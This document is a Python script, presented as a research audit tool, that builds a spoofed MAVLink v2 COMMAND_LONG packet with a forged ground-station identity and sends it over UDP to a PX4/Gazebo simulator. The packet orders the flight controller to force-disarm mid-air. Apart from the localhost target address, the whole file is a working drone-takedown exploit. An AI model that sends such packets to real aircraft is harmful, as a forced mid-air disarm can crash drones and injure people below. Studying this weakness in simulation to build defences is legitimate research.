#!/usr/bin/env python3
"""
MAVLink Research Audit Tool: Raw Unauthorized Packet Injector
Simulates an exploit vector attempting a forceful state mutation (DISARM)
directly over raw UDP port mappings without cryptographic authorization tokens.
"""

import socket
import struct
import time
import sys

# TARGET CONSTRAINTS (Extracted from passive Wireshark observation)
TARGET_IP = "127.0.0.1"
TARGET_PORT = 14540  # Direct raw communication channel to simulated PX4/Gazebo core

CRITICAL_COMMAND_DISARM = 22  # MAV_CMD_COMPONENT_ARM_DISARM
UNAUTHORIZED_SEQUENCE_NUM = 45  # Spoofed sequential indexing block

def calculate_x25_checksum(buffer: bytes) -> int:
    """Calculates the standard ITU-T X.25 / MAVLink CRC-16 checksum."""
    crc = 0xFFFF
    for byte in buffer:
        tmp = byte ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 1) ^ (tmp << 4)
    return crc & 0xFFFF

def build_malicious_disarm_packet() -> bytes:
    """
    Synthesizes a raw, unencrypted standard MAVLink v2 COMMAND_LONG frame
    instructing the flight controller to forcefully disarm mid-air.
    """
    print("[!] Constructing raw unauthorized MAV_CMD_COMPONENT_ARM_DISARM frame...")
    
    # 1. MAVLink v2 Header Assembly
    magic_marker = b'\xFD'
    payload_length = b'\x21'      # 33 bytes payload for a standard COMMAND_LONG
    incompat_flags = b'\x00'
    compat_flags = b'\x00'
    sequence_byte = struct.pack("B", UNAUTHORIZED_SEQUENCE_NUM)
    system_id = b'\xFF'          # Spoofed GCS System Identity (255)
    component_id = b'\x01'       # Spoofed Autopilot Core Component ID (1)
    
    # Message ID for COMMAND_LONG is 76 (Hex: 0x00004C) encoded in 3 bytes Little-Endian
    msg_id_bytes = b'\x4C\x00\x00'
    
    # 2. Payload Serialization (COMMAND_LONG format)
    # Param 1: 0.0 (Force Disarm parameter option)
    param1 = struct.pack("<f", 0.0) 
    # Params 2-7: Unused parameters padded out with zeroes
    padding = struct.pack("<ffffff", 0.0, 0.0, 0.0, 0.0, 0.0, 0.0)
    # Command ID field (uint16_t): 22
    command_field = struct.pack("<H", CRITICAL_COMMAND_DISARM)
    # Target system/component
    target_system = b'\x01'
    target_component = b'\x01'
    confirmation = b'\x00'
    
    # Consolidate complete payload block
    payload = param1 + padding + command_field + target_system + target_component + confirmation
    
    # 3. Formulate Validation Checksum
    header_and_payload = (
        payload_length + incompat_flags + compat_flags + 
        sequence_byte + system_id + component_id + msg_id_bytes + payload
    )
    
    # Append the MAVLink message CRC extra seed for COMMAND_LONG (Seed value: 152)
    crc_calculation_buffer = header_and_payload + b'\x98' # 0x98 = 152
    calculated_crc = calculate_x25_checksum(crc_calculation_buffer)
    crc_bytes = struct.pack("<H", calculated_crc)
    
    # Return finalized attack vector payload wire format
    return magic_marker + header_and_payload + crc_bytes

def main():
    print("==================================================================")
    print("  💥 MAVLINK RESEARCH INJECTOR: EXPLOIT PROFILE INLINE TEST 💥 ")
    print("==================================================================")
    
    # Generate the unencrypted attack frame
    attack_payload = build_malicious_disarm_packet()
    
    # Initialize network transmission apparatus
    try:
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"[+] Attack vector socket bound. Targeting endpoint: {TARGET_IP}:{TARGET_PORT}")
    except Exception as e:
        print(f"[-] Network allocation error: {e}")
        sys.exit(1)
        
    input("\n[PRESS ENTER TO EXECUTE EXPLOIT INJECTION IN SIMULATION WINDOW...]")
    
    try:
        # Transmit payload directly to drone listening interface
        attack_socket.sendto(attack_payload, (TARGET_IP, TARGET_PORT))
        print(f"[🚀] Unauthorized packet string ({len(attack_payload)} bytes) injected successfully.")
        print("[*] Observe Gazebo Console / Wireshark to audit system state response.")
    except Exception as e:
        print(f"[-] Injection execution failure: {e}")
        
    attack_socket.close()

if __name__ == "__main__":
    main()